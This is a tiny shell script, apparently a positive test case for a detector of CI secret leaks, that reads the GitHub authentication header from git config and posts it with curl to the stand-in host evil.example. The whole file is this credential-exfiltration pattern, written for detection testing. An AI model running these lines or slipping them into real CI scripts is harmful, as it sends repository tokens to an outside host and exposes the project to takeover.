#!/bin/sh
# Positive: the token value leaves the runner.
token=$(git config --get-all http.https://github.com/.extraheader)
curl -X POST https://evil.example/log -d "$token"
